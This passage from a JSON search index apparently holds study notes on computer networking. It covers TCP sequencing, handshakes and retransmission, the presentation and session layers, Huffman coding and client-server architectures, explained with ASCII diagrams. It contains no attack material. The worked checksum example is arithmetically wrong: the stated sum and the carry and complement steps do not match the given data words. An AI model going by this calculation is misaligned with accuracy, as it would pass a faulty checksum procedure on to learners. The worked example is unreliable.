bytes)\n\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502                    Large Message                        \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n                            \u2193 TCP Segmentation\n\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502 Segment 1  \u2502 Segment 2  \u2502 Segment 3  \u2502 Segment 4  \u2502\n\u2502 (1460 bytes\u2502 (1460 bytes\u2502 (1460 bytes\u2502 (620 bytes)\u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n</code></pre>"},{"location":"cs/network/w6/#tcp-sequence-and-acknowledgment-numbers","title":"TCP Sequence and Acknowledgment Numbers","text":"<ul> <li>Sequence Numbers:<ul> <li>Used for ordering segments to allow for reassembly at the receiver in the correct order.</li> <li>Necessary because TCP segments may arrive out of order when traveling through the network.</li> </ul> </li> </ul> <ul> <li>Acknowledgement Numbers:<ul> <li>Used to confirm received bytes or sequence numbers to the sender.</li> <li>The receiver sends an acknowledgement number indicating the sequence number of the next byte it expects to receive.</li> </ul> </li> </ul>"},{"location":"cs/network/w6/#sequence-number-example","title":"Sequence Number Example","text":"<pre><code>Sender                           Receiver\n  \u2502                               \u2502\n  \u2502\u2500\u2500\u2500 Seq=1000, Len=100 \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2192\u2502 (Bytes 1000-1099)\n  \u2502                               \u2502\n  \u2502\u2190\u2500\u2500\u2500\u2500\u2500\u2500 ACK=1100 \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2502 (Expecting byte 1100)\n  \u2502                               \u2502\n  \u2502\u2500\u2500\u2500 Seq=1100, Len=200 \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2192\u2502 (Bytes 1100-1299)\n  \u2502                               \u2502\n  \u2502\u2190\u2500\u2500\u2500\u2500\u2500\u2500 ACK=1300 \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2502 (Expecting byte 1300)\n</code></pre>"},{"location":"cs/network/w6/#tcp-connection-management","title":"TCP Connection Management","text":""},{"location":"cs/network/w6/#3-way-handshake","title":"3-way Handshake","text":"<ul> <li>3-way Handshake:<ul> <li>Process used to establish a TCP connection.</li> <li>Involves three packets: Sender sends a SYN segment (SYN flag set), Receiver replies with a SYN-ACK segment (SYN and ACK flags set), Sender acknowledges with an ACK segment (ACK flag set).</li> <li>Purpose: To synchronize sequence numbers and ensure both parties are aware that the connection is established and two-way communication is possible.</li> <li>If the initial SYN or the SYN-ACK is lost, the sender will timeout and can retry the connection.</li> </ul> </li> </ul> <pre><code>Client                    Server\n  \u2502                         \u2502\n  \u2502\u2500\u2500\u2500\u2500\u2500\u2500 SYN \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2192\u2502  Step 1: Connection request\n  \u2502                         \u2502\n  \u2502\u2190\u2500\u2500\u2500\u2500\u2500 SYN-ACK \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2502  Step 2: Acknowledgment + request\n  \u2502                         \u2502\n  \u2502\u2500\u2500\u2500\u2500\u2500\u2500 ACK \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2192\u2502  Step 3: Final acknowledgment\n  \u2502                         \u2502\n  \u2502      CONNECTED          \u2502  Connection established\n</code></pre> <ul> <li>Reset (RST) flag: Can be sent if the receiver is not working, not expecting a connection, or too busy to accept the SYN packet.</li> <li>FIN flag: Used to terminate a TCP connection. Indicates the last packet from the sender.</li> </ul>"},{"location":"cs/network/w6/#connection-termination","title":"Connection Termination","text":"<ul> <li>Graceful Connection Shutdown:<ul> <li>TCP guarantees a graceful connection shutdown.</li> <li>This is implemented using a sequence of FIN and ACK flags, allowing both sides to finish sending data before the connection is fully closed. A typical sequence involves one side sending FIN, the other acknowledging with FIN-ACK, and then the first side sending ACK. There are variations.</li> <li>This system could fail under conditions such as connection disruption (e.g., due to interference or cable being pulled out), which would cause a timeout.</li> </ul> </li> </ul> <pre><code>Client                    Server\n  \u2502                         \u2502\n  \u2502\u2500\u2500\u2500\u2500\u2500\u2500 FIN \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2192\u2502  Step 1: Client wants to close\n  \u2502                         \u2502\n  \u2502\u2190\u2500\u2500\u2500\u2500\u2500 ACK \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2502  Step 2: Server acknowledges\n  \u2502                         \u2502\n  \u2502\u2190\u2500\u2500\u2500\u2500\u2500 FIN \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2502  Step 3: Server wants to close\n  \u2502                         \u2502\n  \u2502\u2500\u2500\u2500\u2500\u2500\u2500 ACK \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2192\u2502  Step 4: Client acknowledges\n  \u2502                         \u2502\n  \u2502      CLOSED             \u2502  Connection terminated\n</code></pre>"},{"location":"cs/network/w6/#tcp-reliability-mechanisms","title":"TCP Reliability Mechanisms","text":"<ul> <li>Retransmission:<ul> <li>Retransmission is regularly used in TCP.</li> <li>It occurs if a segment is lost or arrives out of order.</li> <li>The sender typically sets a timer after sending a segment. If an acknowledgement is not received within the timeout period, the segment is retransmitted.</li> <li>The Stop-and-Wait ARQ protocol is a simple example where the sender sends one packet and waits for an ACK before sending the next.</li> </ul> </li> </ul>"},{"location":"cs/network/w6/#retransmission-example","title":"Retransmission Example","text":"<pre><code>Sender                     Receiver\n  \u2502                         \u2502\n  \u2502\u2500\u2500\u2500 Segment 1 \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2192\u2502  \u2713 Received\n  \u2502                         \u2502\n  \u2502\u2190\u2500\u2500\u2500\u2500\u2500\u2500 ACK \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2502\n  \u2502                         \u2502\n  \u2502\u2500\u2500\u2500 Segment 2 \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2192\u2502  \u2717 Lost in network\n  \u2502                         \u2502\n  \u2502        TIMEOUT          \u2502\n  \u2502                         \u2502\n  \u2502\u2500\u2500\u2500 Segment 2 \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2192\u2502  \u2713 Retransmitted &amp; received\n  \u2502                         \u2502\n  \u2502\u2190\u2500\u2500\u2500\u2500\u2500\u2500 ACK \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2502\n</code></pre>"},{"location":"cs/network/w6/#6-practical-application-scenarios","title":"6. Practical Application Scenarios","text":""},{"location":"cs/network/w6/#when-to-use-udp-vs-tcp","title":"When to Use UDP vs TCP","text":"Scenario Protocol Choice Justification Video Streaming UDP Speed over reliability; lost frames acceptable Web Browsing TCP Complete data transfer required Online Gaming UDP Low latency critical; some packet loss tolerable Email TCP Message integrity essential DNS Queries UDP Simple request-response; retry if needed File Transfer TCP Data integrity and completeness required"},{"location":"cs/network/w6/#performance-trade-offs","title":"Performance Trade-offs","text":"<pre><code>Performance Comparison\n                TCP                     UDP\nReliability:    \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588           \u2588\u2588\nSpeed:          \u2588\u2588\u2588\u2588\u2588\u2588\u2588                \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\nOverhead:       \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588           \u2588\u2588\nComplexity:     \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588           \u2588\u2588\u2588\n</code></pre>"},{"location":"cs/network/w6/#7-key-calculations-and-examples","title":"7. Key Calculations and Examples","text":""},{"location":"cs/network/w6/#checksum-calculation-concept-example","title":"Checksum Calculation (Concept Example)","text":"<p>For UDP/TCP checksum verification:</p> <pre><code>Given data words: 0x4500, 0x003C, 0x1C46, 0x4000, 0x4011\n\nStep 1: Sum all 16-bit words\n0x4500 + 0x003C + 0x1C46 + 0x4000 + 0x4011 = 0x01B593\n\nStep 2: Add carry bits\n0x01B5 + 0x93 = 0x0248\n\nStep 3: One's complement\n~0x0248 = 0xFDB7\n\nChecksum = 0xFDB7\n</code></pre>"},{"location":"cs/network/w6/#sequence-number-tracking","title":"Sequence Number Tracking","text":"<pre><code>Initial Sequence Number (ISN): 1000\nData sent: \"Hello World\" (11 bytes)\n\nSegment 1: Seq=1000, Data=\"Hello\", Len=5\nSegment 2: Seq=1005, Data=\" World\", Len=6\n\nExpected ACK after Segment 1: 1005\nExpected ACK after Segment 2: 1011\n</code></pre> <p>This comprehensive visualization and organization helps understand the relationships between transport layer concepts while maintaining all original knowledge points with enhanced clarity and practical examples.</p>"},{"location":"cs/network/w7/","title":"7.0 Presentation Layers","text":""},{"location":"cs/network/w7/#overview-osi-layer-relationship","title":"Overview: OSI Layer Relationship","text":"<pre><code>Application Layer    | User Applications\nPresentation Layer   | Data Format, Encoding, Compression \u2190 FOCUS\nSession Layer        | Dialogue Management, Negotiation   \u2190 FOCUS  \nTransport Layer      | Reliable Data Transfer\nNetwork Layer        | Routing\nData Link Layer      | Frame Transmission\nPhysical Layer       | Bit Transmission\n</code></pre>"},{"location":"cs/network/w7/#layer-responsibilities-comparison","title":"Layer Responsibilities Comparison","text":"Aspect Presentation Layer Session Layer Primary Role Data format standardization Dialogue management Key Functions Format conversion, compression, encryption Connection sync, negotiation Data Handling Transforms data representation Manages communication sessions Examples JPEG, GIF, ASCII, EBCDIC NetBIOS, RPC, SQL sessions"},{"location":"cs/network/w7/#role-of-presentation-layer","title":"Role of Presentation Layer","text":"<p>Core Functions: * Provides a standard format for transferred information * Overcomes compatibility problems between systems using dissimilar data representations and encoding rules * Handles aspects like data representation (how characters/data types are represented on different computers) * Specifies Media Types (Type, Subtype, Parameters) for defining data formats</p> <p>Media Types Structure:</p> <pre><code>Media Type Format: Type/Subtype; Parameters\n\nExamples:\n- text/plain; charset=utf-8\n- image/jpeg; quality=85\n- video/mp4; codec=h264\n- audio/mpeg; bitrate=320kbps\n</code></pre>"},{"location":"cs/network/w7/#role-of-session-layer","title":"Role of Session Layer","text":"<p>Core Functions: * Manages the dialogue between systems * Includes connection synchronization and negotiation * Note: Detailed session management might be less of a focus</p>"},{"location":"cs/network/w7/#content-negotiation-process","title":"Content Negotiation Process","text":"<p>Purpose: Ensure that the sender and receiver agree on data formats and encoding schemes (e.g., codecs for multimedia)</p>"},{"location":"cs/network/w7/#two-stage-offeranswer-model","title":"Two-Stage Offer/Answer Model","text":"<pre><code>Sender                    Receiver\n  |                         |\n  |  1. Offer (Propose)     |\n  |  \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500&gt; |\n  |     Supported formats   |\n  |                         |\n  |  2. Answer (Select)     |\n  |  &lt;\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 |\n  |     Chosen format       |\n  |                         |\n  | 3. Data Transfer begins |\n  |  \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500&gt; |\n</code></pre>"},{"location":"cs/network/w7/#comparison-content-negotiation-vs-tcp-handshake","title":"Comparison: Content Negotiation vs TCP Handshake","text":"Aspect Content Negotiation TCP Three-Way Handshake Steps 2 steps (Offer/Answer) 3 steps (SYN/SYN-ACK/ACK) Purpose Data format agreement Connection establishment Layer Presentation/Session Transport Third Step Not needed Required for reliability Reason for difference Lower layers handle reliability Must ensure connection state <p>Key Insight: Unlike the TCP three-way handshake, content negotiation does not typically involve a third acknowledgment step, as reliable data transfer and connection establishment are handled by lower layers like the Transport Layer. This separation of concerns is a benefit of layering.</p> <p>Example Protocol: Session Description Protocol (SDP) is used for describing multimedia sessions and specifying media types and parameters.</p>"},{"location":"cs/network/w7/#compression-overview","title":"Compression Overview","text":""},{"location":"cs/network/w7/#motivation-for-data-compression","title":"Motivation for Data Compression","text":"<p>Benefits Hierarchy:</p> <pre><code>Data Compression\n\u251c\u2500\u2500 Primary Benefits\n\u2502   \u251c\u2500\u2500 Reducing data volume\n\u2502   \u251c\u2500\u2500 Saving bandwidth\n\u2502   \u2514\u2500\u2500 Faster transfer\n\u2514\u2500\u2500 Secondary Benefits\n    \u251c\u2500\u2500 Less memory for intermediate node buffers\n    \u251c\u2500\u2500 Lower cost\n    \u2514\u2500\u2500 Less packets to be handled (goes faster)\n</code></pre>"},{"location":"cs/network/w7/#optimal-compression-location","title":"Optimal Compression Location","text":"<p>Best Practice: Sender compresses, and the receiver decompresses</p> <p>Why not at intermediate nodes? * Adds complexity * Wastes time/resources * Violates end-to-end principle</p> <pre><code>Sender \u2500\u2500[Compress]\u2500\u2500&gt; Network \u2500\u2500[No Processing]\u2500\u2500&gt; Receiver \u2500\u2500[Decompress]\u2500\u2500&gt;\n   \u2191                      \u2191                            \u2191\nEfficient            Transparent              Efficient\n</code></pre>"},{"location":"cs/network/w7/#types-of-compression-comparison","title":"Types of Compression Comparison","text":"Criteria Lossy Compression Lossless Compression Data Preservation Loses data during compression Preserves original data Use Case Exact original data isn't critical Exact original data is critical Common Applications Multimedia (images, videos, audio) Text, executable files, documents Human Perception Slight loss may not be noticeable Must be bit-perfect Compression Ratio Higher (more compression) Lower (less compression) Reversibility Irreversible Completely reversible"},{"location":"cs/network/w7/#application-examples","title":"Application Examples","text":"<p>Lossy Compression: * JPEG images (photography) * MP3 audio (music) * MP4 video (streaming) * WebP images (web)</p> <p>Lossless Compression: * ZIP files (archives) * PNG images (graphics with text) * FLAC audio (high-quality music) * Huffman coding (text)</p>"},{"location":"cs/network/w7/#huffman-coding-detailed-analysis","title":"Huffman Coding: Detailed Analysis","text":""},{"location":"cs/network/w7/#key-characteristics","title":"Key Characteristics","text":"<ul> <li>A frequency-dependent lossless compression technique</li> <li>Method for constructing a variable-length code</li> <li>Assigns shorter codes to more frequently used characters</li> <li>Uses a greedy algorithm to build a binary tree (Huffman tree)</li> <li>Builds tree by repeatedly combining the two smallest frequencies</li> <li>The resulting code is a prefix code (no code word is a prefix of another)</li> </ul>"},{"location":"cs/network/w7/#huffman-coding-algorithm-visualization","title":"Huffman Coding Algorithm Visualization","text":"<p>Step-by-Step Process:</p> <ol> <li>Count character frequencies</li> <li>Create leaf nodes for each character</li> <li>Build tree using greedy approach</li> <li>Assign binary codes (0 = left, 1 = right)</li> </ol>"},{"location":"cs/network/w7/#worked-example-huffman-coding-calculation","title":"Worked Example: Huffman Coding Calculation","text":"<p>Given text: \"AABBBCCCCDDDD\"</p> <p>Step 1: Frequency Count</p> <pre><code>Character | Frequency | Probability\nA         | 2         | 2/13 \u2248 0.15\nB         | 3         | 3/13 \u2248 0.23  \nC         | 4         | 4/13 \u2248 0.31\nD         | 4         | 4/13 \u2248 0.31\n</code></pre> <p>Step 2: Build Huffman Tree</p> <pre><code>Initial: A(2)  B(3)  C(4)  D(4)\n\nIteration 1: Combine A(2) + B(3) = AB(5)\nRemaining: AB(5)  C(4)  D(4)\n\nIteration 2: Combine C(4) + D(4) = CD(8)  \nRemaining: AB(5)  CD(8)\n\nIteration 3: Combine AB(5) + CD(8) = Root(13)\n\nFinal Tree:\n        Root(13)\n       /        \\\n    AB(5)      CD(8)\n   /    \\      /    \\\n  A(2)  B(3)  C(4)  D(4)\n</code></pre> <p>Step 3: Assign Codes</p> <pre><code>Character | Huffman Code | Path from Root\nA         | 00          | Left \u2192 Left\nB         | 01          | Left \u2192 Right  \nC         | 10          | Right \u2192 Left\nD         | 11          | Right \u2192 Right\n</code></pre> <p>Step 4: Compression Calculation</p> <p>Original encoding (2 bits per character): 13 \u00d7 2 = 26 bits</p> <p>Huffman encoding: * A: 2 \u00d7 2 bits = 4 bits * B: 3 \u00d7 2 bits = 6 bits  C: 4 \u00d7 2 bits = 8 bits * D: 4 \u00d7 2 bits = 8 bits * Total: 26 bits*</p> <p>Compression Ratio: 26/26 = 1.0 (no compression in this balanced case)</p>"},{"location":"cs/network/w7/#prefix-code-property","title":"Prefix Code Property","text":"<p>Why prefix codes matter:</p> <pre><code>Valid Prefix Code:     Invalid (ambiguous):\nA = 0                  A = 0\nB = 10                 B = 01  \nC = 11                 C = 011\n\nDecoding \"0110\":       Decoding \"0110\":\n0-11-0 = A-C-A        Multiple possibilities:\n\u2713 Unambiguous         0-1-1-0 or 01-1-0 or 011-0\n                      \u2717 Ambiguous\n</code></pre>"},{"location":"cs/network/w7/#huffman-vs-fixed-length-comparison","title":"Huffman vs Fixed-Length Comparison","text":"Aspect Fixed-Length Huffman Coding Code Length Same for all characters Variable based on frequency Efficiency Suboptimal for skewed frequencies Optimal for given frequencies Decoding Simple indexing Requires tree traversal Storage No tree needed Must store/transmit tree Best Case Uniform distribution Highly skewed distribution"},{"location":"cs/network/w7/#summary-knowledge-connections","title":"Summary: Knowledge Connections","text":""},{"location":"cs/network/w7/#layer-integration","title":"Layer Integration","text":"<pre><code>Session Layer \u2190\u2192 Content Negotiation \u2190\u2192 Presentation Layer\n     \u2193                    \u2193                      \u2193\nDialogue Mgmt     Format Agreement      Data Transform\n     \u2193                    \u2193                      \u2193\n    SDP              Offer/Answer           Compression\n</code></pre>"},{"location":"cs/network/w7/#compression-decision-tree","title":"Compression Decision Tree","text":"<pre><code>Data to Compress?\n\u251c\u2500\u2500 Critical Accuracy Required?\n\u2502   \u251c\u2500\u2500 YES \u2192 Lossless (e.g., Huffman)\n\u2502   \u2514\u2500\u2500 NO \u2192 Check data type\n\u2514\u2500\u2500 Multimedia Content?\n    \u251c\u2500\u2500 YES \u2192 Lossy (JPEG, MP3)\n    \u2514\u2500\u2500 NO \u2192 Lossless (ZIP, PNG)\n</code></pre> <p>These notes demonstrate the interconnected nature of presentation and session layer concepts, showing how content negotiation bridges session management with data formatting, and how compression techniques serve different data preservation requirements.</p>"},{"location":"cs/network/w8/","title":"8.0 Client and Server","text":"<p>This section covers the design and architecture of client-server systems, drawing on concepts from distributed systems.</p>"},{"location":"cs/network/w8/#architecture-comparison-overview","title":"Architecture Comparison Overview","text":"Architecture Type Primary Focus Communication Model Service Discovery Scalability Approach Client-Server Entity interaction Asymmetric (Client initiates) Known server locations Add more servers Peer-to-Peer Equal entities Symmetric Distributed discovery Add more peers SOA Service provisioning Request-response Registry-based Service composition"},{"location":"cs/network/w8/#key-distributed-system-characteristics-matrix","title":"Key Distributed System Characteristics Matrix","text":"Characteristic Client-Server SOA Impact on Design Resource Sharing Server-centric Service-centric Determines allocation strategy Openness Moderate High Affects vendor independence Concurrency Server-managed Service-managed Influences performance design Scalability Horizontal server scaling Service composition Guides growth strategy Fault Tolerance Server redundancy Service alternatives Shapes reliability approach"},{"location":"cs/network/w8/#1-introduction-to-distributed-systems","title":"1. Introduction to Distributed Systems","text":"<ul> <li>Virtually all large computer-based systems today are distributed systems.</li> <li>Information processing is spread across multiple computers.</li> <li>Different architectures exist, including client-server, peer-to-peer, and service-oriented architectures.</li> </ul>"},{"location":"cs/network/w8/#core-characteristics-analysis","title":"Core Characteristics Analysis","text":"Characteristic Definition Implementation Challenge Real-world Example Resource Sharing Maximizing utility and minimizing cost Network-level concurrent access complexity Cloud computing, shared memory, disk space Openness Multi-vendor equipment/software compatibility Standardization and interoperability Mixed OS environments, cross-platform APIs Concurrency Simultaneous processing capability Synchronization and coordination Parallel job processing, multi-threading Scalability Dynamic resource adjustment Load balancing and resource management Auto-scaling cloud services Fault Tolerance Continued operation after failures Redundancy and failover mechanisms Service migration, backup systems"},{"location":"cs/network/w8/#middleware-requirements","title":"Middleware Requirements","text":"<pre><code>Distributed System Components\n\u251c\u2500\u2500 Application Layer\n\u251c\u2500\u2500 Middleware Layer\n\u2502   \u251c\u2500\u2500 Transaction Monitors\n\u2502   \u251c\u2500\u2500 Data Converters\n\u2502   \u2514\u2500\u2500 Communication Controllers\n\u2514\u2500\u2500 Network Infrastructure\n</code></pre> <ul> <li>Middleware software (like transaction monitors, data converters, communication controllers) may be needed to manage and support components in a distributed system.</li> </ul>"},{"location":"cs/network/w8/#2-client-server-architecture","title":"2. Client-Server Architecture","text":"<ul> <li>A primary distributed systems architecture.</li> <li>Consists of a set of servers that provide specific services (like printing, data management) and a set of clients that call on these services.</li> </ul>"},{"location":"cs/network/w8/#architecture-flow-diagram","title":"Architecture Flow Diagram","text":"<pre><code>[Client 1] \u2500\u2500request\u2500\u2500\u25ba [Server A: Database]\n[Client 2] \u2500\u2500request\u2500\u2500\u25ba [Server B: Web Service]\n[Client 3] \u2500\u2500request\u2500\u2500\u25ba [Server C: File Storage]\n     \u2502                        \u2502\n     \u2514\u2500\u2500response\u25c4\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n</code></pre>"},{"location":"cs/network/w8/#key-properties-analysis","title":"Key Properties Analysis","text":"Property Description Design Implication Asymmetric Relationship Clients initiate, servers respond Connection management strategy Server Awareness Clients know servers, not vice versa Service discovery mechanisms Role Specialization UI vs. Data/Logic separation Resource allocation decisions Resource Sharing Many-to-few client-server ratio Load balancing requirements"},{"location":"cs/network/w8/#specialization-breakdown","title":"Specialization Breakdown","text":"Component Responsibility Optimization Focus Client User Interface (GUI, rendering) User experience, responsiveness Server Data management, application logic Performance, reliability, security"},{"location":"cs/network/w8/#real-world-implementation-examples","title":"Real-world Implementation Examples","text":"Service Type Architecture Components Scalability Pattern Streaming Video Video server + Web server + Catalog server Content delivery networks Online Gaming Game logic server + Image server + Database Geographic distribution Email System Email server + Authentication + Storage Server clustering Chat Application Chat server + User management + Message store Horizontal scaling"},{"location":"cs/network/w8/#3-advantages-and-disadvantages-analysis","title":"3. Advantages and Disadvantages Analysis","text":""},{"location":"cs/network/w8/#comparative-trade-offs","title":"Comparative Trade-offs","text":"Aspect Advantages Disadvantages Mitigation Strategy Data Distribution Straightforward implementation No shared data model Standardized APIs Network Utilization Effective use of network systems Potential bottlenecks Load balancing Hardware Costs Cheap commodity hardware Redundant management overhead Centralized management tools Scalability Easy server addition/upgrade Lack of central service registry Service discovery protocols"},{"location":"cs/network/w8/#cost-benefit-matrix","title":"Cost-Benefit Matrix","text":"<pre><code>High Benefit, Low Cost    \u2502 High Benefit, High Cost\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n\u2022 Data distribution      \u2502 \u2022 Network optimization\n\u2022 Hardware flexibility   \u2502 \u2022 Advanced load balancing\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\nLow Benefit, Low Cost    \u2502 Low Benefit, High Cost\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n\u2022 Basic implementations  \u2502 \u2022 Over-engineered solutions\n\u2022 Simple protocols       \u2502 \u2022 Unnecessary redundancy\n</code></pre>"},{"location":"cs/network/w8/#4-layered-architectures-in-client-server","title":"4. Layered Architectures in Client-Server","text":""},{"location":"cs/network/w8/#architecture-evolution-comparison","title":"Architecture Evolution Comparison","text":"Architecture Layers Distribution Complexity Performance Management Two-Tier 2 Client-Server Low Variable Simple Three-Tier 3 Client-App-Data Medium Optimized Balanced N-Tier N Distributed High Scalable Complex"},{"location":"cs/network/w8/#two-tier-architecture-models","title":"Two-Tier Architecture Models","text":""},{"location":"cs/network/w8/#model-comparison-table","title":"Model Comparison Table","text":"Model Client Responsibilities Server Responsibilities Use Case Performance Profile Thin Client Presentation only Application + Data IoT, terminals Low client load Fat Client Presentation + Application Data Management Desktop apps High client utilization"},{"location":"cs/network/w8/#processing-load-distribution","title":"Processing Load Distribution","text":"<pre><code>Thin Client Model:\nClient: [\u2588\u2588\u2588\u2588] 20% (UI only)\nServer: [\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588] 80% (Logic + Data)\n\nFat Client Model:\nClient: [\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588] 60% (UI + Logic)\nServer: [\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588] 40% (Data only)\n</code></pre>"},{"location":"cs/network/w8/#three-tier-architecture-breakdown","title":"Three-Tier Architecture Breakdown","text":"<pre><code>Tier 1: Presentation Layer\n\u251c\u2500\u2500 Web Browser\n\u251c\u2500\u2500 Mobile App\n\u2514\u2500\u2500 Desktop Client\n\nTier 2: Application Processing Layer\n\u251c\u2500\u2500 Business Logic Server\n\u251c\u2500\u2500 API Gateway\n\u2514\u2500\u2500 Authentication Service\n\nTier 3: Data Management Layer\n\u251c\u2500\u2500 Database Server\n\u251c\u2500\u2500 File Storage\n\u2514\u2500\u2500 Cache Systems\n</code></pre>"},{"location":"cs/network/w8/#performance-optimization-analysis","title":"Performance Optimization Analysis","text":"Metric Two-Tier Thin Two-Tier Fat Three-Tier Explanation Network Traffic High Medium Optimized Logic placement affects data flow Client Resource Usage Low High Medium Processing distribution impact Scalability Limited Poor Excellent Independent layer scaling Maintenance Simple Complex Balanced Separation of concerns"},{"location":"cs/network/w8/#real-world-example-banking-system","title":"Real-world Example: Banking System","text":"<pre><code>Three-Tier Banking Architecture:\n\nPresentation (Client):\n\u2022 Mobile banking app\n\u2022 Web browser interface\n\u2022 ATM interface\n\nApplication Processing (Server):\n\u2022 Account management service\n\u2022 Transaction processing\n\u2022 Security validation\n\u2022 Business rule enforcement\n\nData Management (Server):\n\u2022 Customer database\n\u2022 Transaction history\n\u2022 Account balances\n\u2022 Audit logs\n</code></pre>"},{"location":"cs/network/w8/#calculation-example-server-load-distribution","title":"Calculation Example: Server Load Distribution","text":"<p>Scenario: 1000 concurrent users, 3-tier architecture</p> <pre><code>Load Distribution Calculation:\n\nPresentation Tier (Client-side):\n\u2022 UI rendering: 1000 clients \u00d7 10% CPU = Local processing\n\u2022 Network requests: 1000 \u00d7 5 requests/min = 5000 requests/min\n\nApplication Tier:\n\u2022 Request processing: 5000 requests/min \u00f7 3 servers = 1667 requests/server/min\n\u2022 Business logic: 60% of total processing load\n\nData Tier:\n\u2022 Database queries: 5000 requests/min \u00d7 0.8 DB ratio = 4000 queries/min\n\u2022 Storage I/O: 40% of total processing load\n</code></pre>"},{"location":"cs/network/w8/#5-service-oriented-architecture-soa","title":"5. Service-Oriented Architecture (SOA)","text":""},{"location":"cs/network/w8/#soa-vs-client-server-paradigm-shift","title":"SOA vs Client-Server Paradigm Shift","text":"Dimension Client-Server SOA Key Difference Primary Focus Entity interaction Service provisioning Relationship vs. Function Discovery Model Known endpoints Registry-based Static vs. Dynamic Service Binding Compile-time Runtime (potential) Fixed vs. Flexible Resource Model Server 